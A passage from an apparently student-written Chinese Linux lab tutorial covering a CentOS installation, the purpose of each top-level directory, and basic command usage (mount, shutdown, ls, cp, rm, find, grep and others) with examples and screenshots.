<li><p>选择安装将使用基本存储设备；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image040.jpg" alt="img"></p>
</li>
<li><p>提示存储设备警告，选择忽略所有数据；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image042.jpg" alt="img"></p>
</li>
<li><p>明明计算机为<code>localhost.leeyuxun</code>，网络设置选择有线<code>system the0；</code></p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image044.jpg" alt="img"></p>
</li>
<li><p>时区设置为上海；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image046.jpg" alt="img"></p>
</li>
<li><p>设置跟用户密码；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image048.jpg" alt="img"></p>
</li>
<li><p>安装种类选择创建自定义布局；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image050.jpg" alt="img"></p>
</li>
<li><p>创建一个<code>200M</code>的<code>ext4</code>分区，挂载到<code>/boot</code>下，依次点击<strong>创建→标准分区→创建</strong>，挂载点选择<code>/boot</code>；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image052.jpg" alt="img"></p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image054.jpg" alt="img"></p>
</li>
<li><p>用上述方法创建一个<code>swap</code>分区，不设置挂载点，大小为内存的2倍即4GB，再创建一个<code>ext4</code>分区，挂载到/目录下，选择“使用全部可用空间”；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image056.jpg" alt="img"></p>
</li>
<li><p>然后选择<strong>格式化→将修改写入磁盘</strong>，点击下一步；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image058.jpg" alt="img"></p>
</li>
<li><p>基本服务器安装软件组选择桌面，存储库选择自定义；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image060.jpg" alt="img"></p>
</li>
<li><p>左侧选择桌面，右侧全部选择；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image062.jpg" alt="img"></p>
</li>
<li><p>左侧选择开发，右侧选择桌面平台开发和开发工具；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image064.jpg" alt="img"></p>
</li>
<li><p>语言支持选择世界语和中文；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image066.jpg" alt="img"></p>
</li>
<li><p>点击下一步开始安装软件包；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image068.jpg" alt="img"></p>
</li>
<li><p>安装完成后选择重新引导；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image070.jpg" alt="img"></p>
</li>
<li><p>同意许可证信息；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image072.jpg" alt="img"></p>
</li>
<li><p>设置用户米、全名、密码，创建用户；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image074.jpg" alt="img"></p>
</li>
<li><p>设置日期和时间；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image074.jpg" alt="img"></p>
</li>
<li><p>设置<code>Kdump</code>内存为<code>128M</code>；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image078.jpg" alt="img"></p>
</li>
<li><p>重启后进入桌面，显示如下，安装完成；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image080.jpg" alt="img"></p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image082.jpg" alt="img"></p>
</li>
</ol>
<h2 id="熟悉Linux目录结构以及目录功能简介"><a href="#熟悉Linux目录结构以及目录功能简介" class="headerlink" title="熟悉Linux目录结构以及目录功能简介"></a>熟悉<code>Linux</code>目录结构以及目录功能简介</h2><ol>
<li><p>安装<code>tree</code>，在打开终端，顶级目录下输入<code>tree -L 1</code>，输出一级目录如下，包括文件夹有：<code>bin</code>、<code>boot</code>、<code>dev</code>、<code>etc</code>、<code>home</code>、<code>lib</code>、<code>lost+found</code>、<code>media</code>、<code>misc</code>、<code>mnt</code>、<code>opt</code>、<code>proc</code>、<code>root</code>、<code>sbin</code>、<code>selinux</code>、<code>srv</code>、<code>sys</code>、<code>tmp</code>、<code>usr</code>、<code>var</code>等；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image084.jpg" alt="img"></p>
</li>
<li><p>分析每个文件夹功能：</p>
<ol>
<li><p><code>/bin</code><br>文件内容如下，用于存放使用者最经常使用的命令，如：<code>cat</code>、<code>ls</code>、<code>vi</code>等<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image086.jpg" alt="img"></p>
</li>
<li><p><code>/boot</code><br>文件内容如下，这里存放的是启动<code>Linux</code>时使用的一些核心文件，包括一些连接文件以及镜像文件；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image088.jpg" alt="img"></p>
</li>
<li><p><code>/dev</code><br>文件内容如下，<code>dev</code>是**Device(设备)**的缩写，该目录下存放的是<code>Linux</code>的外部设备，在<code>Linux</code>中访问设备的方式和访问文件的方式是相同的；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image090.jpg" alt="img"></p>
</li>
<li><p><code>/etc</code><br>文件内容如下，这个目录用来存放所有的系统管理所需要的配置文件和子目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image092.jpg" alt="img"></p>
</li>
<li><p><code>/home</code><br>文件内容如下，是用户的主目录，在<code>Linux</code>中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，前面提到该机器用户的用户名为<code>levi</code>；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image094.jpg" alt="img"></p>
<ol>
<li><p><code>/lib</code><br>文件内容如下，这个目录里存放着系统最基本的动态连接共享库，其作用类似于<code>Windows</code>里的<code>DLL</code>文件。几乎所有的应用程序都需要用到这些共享库。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image096.jpg" alt="img"></p>
</li>
<li><p><code>/lost+found</code><br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件；</p>
</li>
<li><p><code>/media</code><br><code>Linux</code>系统会自动识别一些设备，例如U盘、光驱等等，当识别后，<code>Linux</code>会把识别的设备挂载到这个目录下；</p>
</li>
<li><p><code>/misc</code><br>该目录自动挂载服务目录，对应<code>autofs</code>服务；</p>
</li>
<li><p><code>/mnt</code><br>目录内容如下，系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在<code>/mnt</code>上，然后进入该目录就可以查看光驱里的内容了。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image098.jpg" alt="img"></p>
</li>
<li><p><code>/opt</code><br>文件内容如下，这是给主机额外安装软件所摆放的目录。比如安装一个<code>ORACLE</code>数据库则就可以放到这个目录下，默认是空的；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image100.jpg" alt="img"></p>
</li>
<li><p><code>/proc</code><br>这个目录的内容不在硬盘上而是在内存里，可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的<code>ping</code>命令，使别人无法<code>ping</code>该机器；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure></li>
<li><p><code>/root</code><br>文件目录如下，该目录为系统管理员，也称作超级权限者的用户主目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image102.jpg" alt="img"></p>
</li>
<li><p><code>/sbin</code><br>文件目录如下，<code>s</code>就是<code>Super User</code>的意思，这里存放的是系统管理员使用的系统管理程序；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image104.jpg" alt="img"></p>
</li>
<li><p><code>/selinux</code><br> 文件目录如下，这个目录是<code>Redhat/CentOS</code>所特有的目录，<code>Selinux</code>是一个安全机制，类似于<code>windows</code>的防火墙，但是这套机制比较复杂，这个目录就是存放<code>selinux</code>相关的文件的；<br> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image106.jpg" alt="img"></p>
</li>
<li><p><code>/srv</code><br>  该目录存放一些服务启动之后需要提取的数据；</p>
</li>
<li><p><code>/sys</code><br>  文件目录如下，这是<code>linux2.6</code>内核的一个很大的变化，该目录下安装了<code>2.6</code>内核中新出现的一个文件系统<code>sysfs</code>，<code>sysfs</code>文件系统集成了下面3种文件系统的信息：针对进程信息的<code>proc</code>文件系统、针对设备的<code>devfs</code>文件系统以及针对伪终端的<code>devpts</code>文件系统。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建；<br>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image108.jpg" alt="img"></p>
</li>
<li><p><code>/tmp</code><br>  这个目录是用来存放一些临时文件的；</p>
</li>
<li><p><code>/usr</code><br>  这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于<code>windows</code>下的<code>program files</code>目录；<br>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image110.jpg" alt="img"></p>
<ol>
<li><code>/usr/bin</code><br>该目录下存放着许多系统用户使用的应用程序</li>
<li><code>/usr/include</code><br>改目录下存放LINUX下开发和编译应用程序需要的头文件</li>
<li><code>/usr/lib</code><br>改目录下存放一些常用的动态链接共享库和静态档案库；</li>
<li><code>/usr/local</code><br>提供给一般用户的/usr目录，在这安装软件最适合；</li>
<li><code>/usr/man</code><br>该目录是帮助文档目录；</li>
<li><code>/usr/sbin</code><br>改目录存放超级用户使用的比较高级的管理程序和系统守护程序；</li>
<li><code>/usr/share</code><br>该目录包含 <code>/usr</code> 中的应用程序需要的所有只读、与硬件架构无关的数据，其中包括时区和地区信息(<code>zoneinfo</code> 和 <code>locale</code>)；</li>
<li><code>/usr/src</code><br>这是内核源代码默认的放置目录； </li>
</ol>
</li>
<li><p><code>/var</code><br>  文件目录如下，这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在<code>/var/log</code>目录下，另外mail的预设放置也是在这里；<br>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image112.jpg" alt="img"></p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="熟悉Linux系统的基本操作"><a href="#熟悉Linux系统的基本操作" class="headerlink" title="熟悉Linux系统的基本操作"></a>熟悉<code>Linux</code>系统的基本操作</h2><h3 id="Linux挂载"><a href="#Linux挂载" class="headerlink" title="Linux挂载"></a><code>Linux</code>挂载</h3><p>通过mount命令查看已挂载的文件系统，会输出丰富的信息，如下图所示<br> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image114.jpg" alt="img"></p>
<ul>
<li><p><strong>mount [-t</strong> <strong>系统类型] [-L 卷标名] [-o 特殊选项] [-n] 设备文件名 挂载点</strong></p>
<p>各选项的含义：</p>
<ul>
<li>-t 系统类型：指定欲挂载的文件系统类型。Linux 常见的支持类型有 EXT2、EXT3、EXT4、iso9660（光盘格式）、vfat、reiserfs 等。如果不指定具体类型，挂载时 Linux 会自动检测；</li>
</ul>
</li>
<li><p>-L 卷标名：除了使用设备文件名（例如 /dev/hdc6）之外，还可以利用文件系统的卷标名称进行挂载；</p>
<ul>
<li>-n：在默认情况下，系统会将实际挂载的情况实时写入 /etc/mtab 文件中，但在某些场景下（例如单人维护模式），为了避免出现问题，会刻意不写入，此时就需要使用这个选项；</li>
<li>-o 特殊选项：可以指定挂载的额外选项，比如读写权限、同步/异步等，如果不指定，则使用默认值（defaults）；</li>
</ul>
</li>
<li><p>命令尝试：<br>使用命令<code>mount -t iso9660 /dev/cdrom /mnt/cdrom</code>将<code>/dev/cdrom</code>下的<code>iso9660</code>文件挂载到<code>/mnt/cdrom</code>文件目录下；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image116.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image118.jpg" alt="img"></p>
</li>
</ul>
<h3 id="Linux系统的启动与退出"><a href="#Linux系统的启动与退出" class="headerlink" title="Linux系统的启动与退出"></a><code>Linux</code>系统的启动与退出</h3><ul>
<li><strong>shutdown [-t seconds] [-rkhncfF] time [message]</strong><br>参数说明：<ul>
<li>-t seconds，设定在几秒钟之后进行关机程序。</li>
<li>-k，并不会真的关机，只是将警告讯息传送给所有使用者。</li>
<li>-r，关机后重新开机。</li>
<li>-h，关机后停机。</li>
<li>-n，采用正常程序来关机，用强迫的方式杀掉所有执行中的程序后自行关机。</li>
<li>-c，取消目前已经进行中的关机动作。</li>
<li>-f，关机时，不做 fcsk 动作(检查 Linux 档系统)。</li>
<li>-F，关机时，强迫进行 fsck 动作。</li>
<li>time，设定关机的时间。</li>
<li>message，传送给所有使用者的警告讯息。</li>
</ul>
</li>
<li>命令尝试：<ul>
<li>Shutdown now     //立刻关机</li>
<li>shutdown +5 “System will shutdown after 5 minutes”    //    系统提示五分钟后关机，每分钟提醒一次<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image120.jpg" alt="img"></li>
<li>shutdown –r now  //立即重启</li>
<li>shutdown –r 23:59       //23:59重启</li>
<li>shutdown –h now        //将系统的服务停掉之后立即关机</li>
<li>shutdown -k now ‘this system will reboot’ //立刻发送警告信息<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image122.jpg" alt="img"></li>
</ul>
</li>
</ul>
<h3 id="Linux系统对文件和目录的操作命令"><a href="#Linux系统对文件和目录的操作命令" class="headerlink" title="Linux系统对文件和目录的操作命令"></a>Linux系统对文件和目录的操作命令</h3><ol>
<li><p>ls命令</p>
<ul>
<li><p>**ls [**<strong>选项] [目录或文件]</strong></p>
<p>显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p>
<p>选项包括：</p>
<ul>
<li><code>-a</code>，显示所有的文件，包括隐藏文件(以.开头的文件)；</li>
<li><code>-A</code>，同 <code>-a</code> ，但不列出 “.” (目前目录) 及 “..” (父目录)；</li>
<li><code>-c</code>，和<code>-lt</code>一起使用，显示列表并且以<code>ctime</code>(文件状态最后改变时间)排序。和<code>-l</code>一起使用：显示<code>ctime</code>并且以文件名排序。其他情况，以<code>ctime</code>排序；</li>
<li><code>-d</code>，仅列出目录本身，而不是列出目录里的内容列表；</li>
<li><code>-f</code>，直接列出结果，而不进行排序(<code>ls</code>默认会以文件名排序)；</li>
<li><code>-F</code> 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“；</li>
<li><code>-g</code>，列表显示结果，和<code>-l</code>类似，但是不显示文件所属者；</li>
<li><code>-h</code>，将文件内容大小以<code>GB</code>、<code>KB</code>等易读的方式显示；</li>
<li><code>-i</code>，结合<code>-l</code>参数，列出每个文件的<code>inode</code>；</li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>
<li>-l：列出长数据串，显示出文件详细信息，依次为文件属性(占10个字符空间)、文件数、拥有者、所属的<code>group</code>、文件大小、建档日期、文件名；<ul>
<li>实例如下<ul>
<li><code>ls -l</code>     //将目录下的文件信息详细列出<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image124.jpg" alt="img"></li>
<li><code>ls –ld media</code>   //列出文件目录下文件media的详细信息<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image126.jpg" alt="img"></li>
<li><code>ls -as -S</code>        //列出所有文件及文件大小，并以文件大小进行排序<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image128.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p>cp命令</p>
<ul>
<li><p>**cp [**<strong>选项] 源文件或目录 目标文件或目录</strong></p>
<p>将源文件或目录拷贝到目标文件或目录</p>
<p>选项包括：</p>
<ul>
<li>-a，此选项通常在复制目录时使用，它保留链接、文件属性，并复制目录下的所有内容；</li>
<li>-d，复制时保留链接，这里所说的链接相当于Windows系统中的快捷方式；</li>
<li>-f，覆盖已经存在的目标文件而不给出提示；</li>
<li>-i，与-f选项相反，在覆盖目标文件之前给出提示，要求用户确认是否覆盖，回答”y”时目标文件将被覆盖；</li>
<li>-p，除复制文件的内容外，还把修改时间和访问权限也复制到新文件中；</li>
<li>-r，若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件；</li>
<li>-l，不复制文件，只是生成链接文件；</li>
</ul>
</li>
<li><p>实例如下：</p>
<ul>
<li><code>cp tree.txt tree1.txt</code>      //将tree.txt内容复制到tree1.txt里<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image130.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image132.jpg" alt="img"></li>
<li><code>cp -i /root/桌面/json/json.txt /root/桌面/tree/tree1.txt</code>         //将/root/桌面/json目录下的json.txt复制到/root/桌面/tree/tree1.txt并覆tree.txt内容；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image134.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image136.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>mv命令</p>
<ul>
<li><p>**mv [**<strong>选项] 源文件或目录 目标文件或目录</strong></p>
<table>
<thead>
<tr>
<th align="center">结构</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mv   文件名   文件名</td>
<td align="center">将源文件名改为目标文件名</td>
</tr>
<tr>
<td align="center">mv   文件名   目录名</td>
<td align="center">将文件移动到目标目录</td>
</tr>
<tr>
<td align="center">mv   目录名   目录名</td>
<td align="center">目标目录已存在，将源目录移动到目标目录；   目标目录不存在则改名</td>
</tr>
<tr>
<td align="center">mv   目录名   文件名</td>
<td align="center">出错</td>
</tr>
</tbody></table>
<p>选项包括：</p>
<ul>
<li>-i，若指定目录已有同名文件，则先询问是否覆盖旧文件;</li>
<li>-f，在mv操作要覆盖某已有的目标文件时不给任何指示;</li>
</ul>
</li>
<li><p>实例如下</p>
<ul>
<li><code>mv json.txt tree.txt</code>       //将json.txt改为tree.txt；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image138.jpg" alt="img"></li>
<li><code>mv tree.txt ..</code>         //将tree.txt移动至父目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image140.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>rm命令</p>
<ul>
<li><p>**rm [**<strong>选项] 文件名|目录名</strong></p>
<p>选项包括：</p>
<ul>
<li>-i，删除前逐一询问确认；</li>
<li>-f，即使原档案属性设为唯读，亦直接删除，无需逐一确认；</li>
<li>-r，将目录及以下之档案亦逐一删除；</li>
</ul>
</li>
<li><p>实例如下</p>
<ul>
<li>rm tree.txt     //删除tree.txt文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image142.jpg" alt="img"></li>
<li>rm –i *           //删除目录下所有文件并在删除前询问<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image144.jpg" alt="img"></li>
<li>rm -rf tree     //删除目录下的tree文件，不询问，即使tree是只读文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image146.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p><code>mkdir</code>命令</p>
<ul>
<li><p>**mkdir [**<strong>选项] dir-name</strong></p>
<p>用于建立子目录</p>
<p>选项包括：</p>
<ul>
<li>-p，确保目录名称存在，不存在的就建一个；</li>
<li>-m，设定权限（类似chmod）;</li>
<li>-v，每次创建目录都显示信息；</li>
</ul>
</li>
<li><p>实例如下</p>
<ul>
<li>mkdir tree     //目录下新建名为tree的子目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image148.jpg" alt="img"></li>
<li>mkdir -p mine/tree             //在工作目录的mine目录下新建名为tree的子目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image150.jpg" alt="img"></li>
<li>mkdir -m 744 list  //创建权限为774的目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image152.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>rmdir命令</p>
<ul>
<li><p>**rmdir [**<strong>选项] dir-name</strong></p>
<p>删除空目录，无法删除非空目录；</p>
<p>选项包括：</p>
<ul>
<li>-p，递归删除目录dirname，当子目录删除后其父目录为空时，也一同被删除；</li>
<li>-v，显示指令执行过程；</li>
</ul>
</li>
<li><p>实例如下：</p>
<ul>
<li>rmdir tree             //删除目录tree<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image154.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>cd命令</p>
<ul>
<li><p><strong>cd [dirName]</strong></p>
<p>切换目录，dirName表示要切换的目标目录</p>
</li>
<li><p>实例如下：</p>
<ul>
<li>cd ..        //返回到上一级目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image156.jpg" alt="img"></li>
<li>cd /root  //进入到root目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image158.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>pwd命令</p>
<p>​        用于显示工作目录</p>
<ul>
<li><p>实例如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image160.jpg" alt="img"></p>
</li>
</ul>
</li>
<li><p>cat命令</p>
<ul>
<li><p>**cat [**<strong>选项] 文件列表</strong></p>
<p>用于连接文件并打印到标准输出设备上；</p>
<p>选项包括：</p>
<ul>
<li>-n，由 1 开始对所有输出的行数编号；</li>
<li>-b，和 -n 相似，只不过对于空白行不编号；</li>
<li>-s，当遇到有连续两行以上的空白行，就代换为一行的空白行；</li>
<li>-v，使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外；</li>
<li>-E，在每行结束处显示 $；</li>
<li>-T，将 TAB 字符显示为 ^I；</li>
<li>-A，等价于 -vET；</li>
<li>-e，等价于”-vE”选项； </li>
<li>-t，等价于”-vT”选项；</li>
</ul>
</li>
<li><p>实例如下：</p>
<ul>
<li>cat –b tree.txt        //输出tree.txt内容，且不对空行进行编号；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image162.jpg" alt="img"></li>
<li>cat &gt; mine.txt //清空mine.txt内容<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image164.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image166.jpg" alt="img"></li>
<li>Zcat file1 file2 &gt; file3     //file1和file2的文档内容，附加到file3里；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image168.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>find命令</p>
<ul>
<li><p><strong>find path -option [-print] [-exec -ok |xargs |grep] [command {} ;]</strong></p>
<p>用来在指定目录下查找文件，任何位于参数之前的字符串都将被视为欲查找的目录名，如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件，并且将查找到的子目录和文件全部进行显示；</p>
<p>选项包括：</p>
<ul>
<li>path<ul>
<li>~表示$HOME目录;</li>
<li>**.**表示当前目录</li>
<li>/表示根目录</li>
</ul>
</li>
<li>-print，<strong>表示将结果输出到标准输出</strong>；</li>
<li>-exec，对匹配的文件执行该参数所给出的shell命令，形式为”command {} ;”；</li>
<li>-ok，与exec作用相同，区别在于，在执行命令之前，会给出提示，让用户确认是否执行；</li>
<li>|xargs，与exec作用相同 ，起承接作用，区别在于 |xargs 主要用于承接删除操作，而-exec都可用，如复制、移动、重命名等；</li>
<li>option，表示查找方式：<ul>
<li>-name filename    //查找名为filename的文件</li>
<li>-perm    //按执行权限来查找</li>
<li>-user username    //按文件属主来查找</li>
<li>-group groupname     //按组来查找</li>
<li>-mtime -n +n       //按文件更改时间来查找文件，-n指n天以内，+n指n天以前</li>
<li>-atime -n +n        //按文件访问时间来查找文件，-n指n天以内，+n指n天以前</li>
<li>-ctime -n +n        //按文件创建时间来查找文件，-n指n天以内，+n指n天以前</li>
<li>-nogroup      //查无有效属组的文件，即文件的属组在/etc/groups中不存在</li>
<li>-nouser         //查无有效属主的文件，即文件的属主在/etc/passwd中不存</li>
<li>-type b/d/c/p/l/f         //查是块设备、目录、字符设备、管道、符号链接、普通文件</li>
<li>-size n[c]       //查长度为n块[或n字节]的文件</li>
<li>-mount  //查文件时不跨越文件系统mount点</li>
<li>-follow   //如果遇到符号链接文件，就跟踪链接所指的文件</li>
<li>-prune   //忽略某个目录</li>
</ul>
</li>
</ul>
</li>
<li><p>实例如下：</p>
<ul>
<li>find / -name a.txt        //在根目录查找名字为file1.txt的文件；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image170.jpg" alt="img"></li>
<li>find / -name <em>.htm –a –user leeyuxun       //在根目录下查找属主为leeyuxun的htm文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image172.jpg" alt="img"></em></li>
<li>find . –name &quot;*.txt&quot; -print    //在当前目录查找txt文件并打印<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image174.jpg" alt="img"></li>
<li>find /dev -user leeyuxun -print         //查找dev目录下的属主为leeyuxun的文件并打印；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image176.jpg" alt="img"></li>
<li>find . -name “*.o” -mtime +1 -mtime -7 -print      //查找7天以内1天以前的o文件并打印；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image178.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>grep命令</p>
<ul>
<li><p><strong>grep [-abcEFGhHilLnqrsvVwxy][-A&lt;****显示列数&gt;][-B&lt;显示列数&gt;][-C&lt;显示列数&gt;][-d&lt;进行动作&gt;][-e&lt;范本样式&gt;][-f&lt;范本文件&gt;][–help][范本样式][文件或目录…]</strong></p>
<p>选项内容：</p>
<ul>
<li>-a，不要忽略二进制的数据；</li>
<li>-A，除了显示符合范本样式的那一列之外，并显示该行之后的内容</li>
<li>-b，在显示符合样式的那一行之前，标示出该行第一个字符的编号</li>
<li>-B，除了显示符合样式的那一行之外，并显示该行之前的内容</li>
<li>-c，计算符合样式的列数；</li>
<li>-C，除了显示符合样式的那一行之外，并显示该行之前后的内容；</li>
<li>-d，当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作；</li>
<li>-e，指定字符串做为查找文件内容的样式；</li>
<li>-E，将样式为延伸的正则表达式来使用；</li>
<li>-f，指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式；</li>
<li>-F，将样式视为固定字符串的列表；</li>
<li>-G，将样式视为普通的表示法来使用；</li>
<li>-h，在显示符合样式的那一行之前，不标示该行所属的文件名称；</li>
<li>-H，在显示符合样式的那一行之前，表示该行所属的文件名称；</li>
<li>-i，忽略字符大小写的差别；</li>
<li>-I，列出文件内容符合指定的样式的文件名称；</li>
<li>-L，列出文件内容不符合指定的样式的文件名称；</li>
<li>-n，在显示符合样式的那一行之前，标示出该行的列数编号；</li>
<li>-o，只显示匹配PATTERN 部分；</li>
<li>-q，不显示任何信息；</li>
<li>-r，此参数的效果和指定”-d recurse”参数相同；</li>
<li>-s，不显示错误信息；</li>
<li>-v，显示不包含匹配文本的所有行；</li>
<li>-V，显示版本信息；</li>
<li>-w，只显示全字符合的列；</li>
<li>-x，只显示全列符合的列；</li>
<li>-y，此参数的效果和指定”-i”参数相同；</li>
</ul>
</li>
<li><p>实例如下：</p>
<ul>
<li>grep mine *          //在该目录下查找包含mine内容的文件；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image180.jpg" alt="img"></li>
<li>grep ‘text file’ example        //在mine.txt中搜索字符串‘mine 12’并打印；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image182.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>more命令</p>
<ul>
<li><p>**more [**<strong>选项] 文件名</strong></p>
<p>类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似）</p>
<p>选项内容：</p>
<ul>
<li>-num，一次显示的行数；</li>
<li>-d，提示使用者，在画面下方显示 [Press space to continue, ‘q’ to quit.] ，如果使用者按错键，则会显示 [Press ‘h’ for instructions.] 而不是 ‘哔’ 声；</li>
